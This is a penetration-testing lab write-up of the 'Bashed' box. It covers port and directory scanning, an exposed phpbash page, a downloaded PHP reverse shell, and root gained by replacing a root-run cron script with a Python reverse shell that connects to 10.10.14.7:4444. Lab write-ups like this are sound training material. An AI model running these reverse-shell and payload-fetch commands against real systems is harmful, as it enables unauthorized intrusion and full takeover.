# Rust scan

```bash
ghost@localhost [19:47:00] [~/Documents/tj-null-boxes/bashed] [master]
-> % rustscan -a 10.10.10.68 --ulimit 5000 -- -sC -sV
[~] The config file is expected to be at "/home/ghost/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.68:80

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

<br/>

# Gobuster

```bash
ghost@localhost [19:48:34] [~/Documents/tj-null-boxes/bashed] [master]
-> % gobuster dir -u http://10.10.10.68 -k -w /usr/share/dirb/wordlists/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/21 19:48:55 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 295]
/.hta                 (Status: 403) [Size: 290]
/.htpasswd            (Status: 403) [Size: 295]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/index.html           (Status: 200) [Size: 7743]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
...
```

<br/>

# PHP Bash

http://10.10.10.68/dev/phpbash.php

PHP bash exists on server. Netcat is also on the server.

```bash
www-data@bashed:/var/www/html/dev# ls
phpbash.min.php  
phpbash.php  

www-data@bashed:/var/www/html/dev# nc
This is nc from the netcat-openbsd package. An alternative nc is available  
in the netcat-traditional package.  
usage: nc [-46bCDdhjklnrStUuvZz] [-I length] [-i interval] [-O length]  
[-P proxy_username] [-p source_port] [-q seconds] [-s source]  
[-T toskeyword] [-V rtable] [-w timeout] [-X proxy_protocol]  
[-x proxy_address[:port]] [destination] [port]****
```

However, we cannot establish a reverse shell with netcat from PHP bash. Therefore, I host [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and download it to the server. Later, directly accessing the file to execute reverse connection.

```bash
www-data@bashed:/var/www/html/dev# wget http://10.10.14.7:8000/php-reverse-shell.php -O ../uploads/reverse.php
--2022-08-21 04:59:39-- http://10.10.14.7:8000/php-reverse-shell.php  
Connecting to 10.10.14.7:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 5491 (5.4K) [application/octet-stream]  
Saving to: '../uploads/reverse.php'  
  
0K ..... 100% 22.7M=0s  
  
2022-08-21 04:59:40 (22.7 MB/s) - '../uploads/reverse.php' saved [5491/5491]
```

Then you can get reverse shell by accessing http://10.10.10.68/uploads/reverse.php.

```bash
ghost@localhost [20:00:02] [~/Documents/tj-null-boxes/bashed] [master *]
-> % nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 42124
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:00:27 up 13 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

<br/>

# Privilege Escalation

It seems `www-data` can execute files as `scriptmanager`. Using this, I can change the user and re-run linpeas.

```bash
...
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
...
```

I login to script manager, and run linpeas again.

```bash
www-data@bashed:/tmp$ sudo -i -u scriptmanager
scriptmanager@bashed:~$
```

This time found a folder `script` owned by `scriptmanager`.

```bash
╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
/scripts

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/scripts/test.txt
/home/scriptmanager/.gnupg/trustdb.gpg
/home/scriptmanager/.gnupg/pubring.gpg
/home/scriptmanager/.gnupg/gpg.conf
/var/log/auth.log
/var/log/syslog
```

Inside `script` folder got 2 files,  `test.py` and `test.txt`. The content of `test.py` looks like below.

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Which open `test.txt` and write the text inside. When we see the permission of `test.txt` it is owned by root.

```bash
scriptmanager@bashed:/scripts$ ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Aug 21 05:24 test.txt
```

That means, root user is running the  `test.py` (file owned by `scriptmanager`) periodically.

So, we moved the original file to `.bk` and replaced with python script that actually connects back to another reverse shell running at port `4444`.

The file looks like below.

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```

```bash
scriptmanager@bashed:/scripts$ wget 10.10.14.7:8000/pe.py
--2022-08-21 06:17:38--  http://10.10.14.7:8000/pe.py
Connecting to 10.10.14.7:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 214 [text/x-python]
Saving to: 'pe.py'

pe.py               100%[===================>]     214  --.-KB/s    in 0s

2022-08-21 06:17:39 (21.7 MB/s) - 'pe.py' saved [214/214]

scriptmanager@bashed:/scripts$ mv pe.py test.py
```

```bash
ghost@localhost [21:17:44] [~/Documents/tj-null-boxes/bashed] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.10.68] 50854
bash: cannot set terminal process group (48956): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts# id
uid=0(root) gid=0(root) groups=0(root)
```

<br/>

# Flags

```bash
$ cat user.txt
4188****
```

```bash
root@bashed:/scripts# cat /root/root.txt
4b44****
```
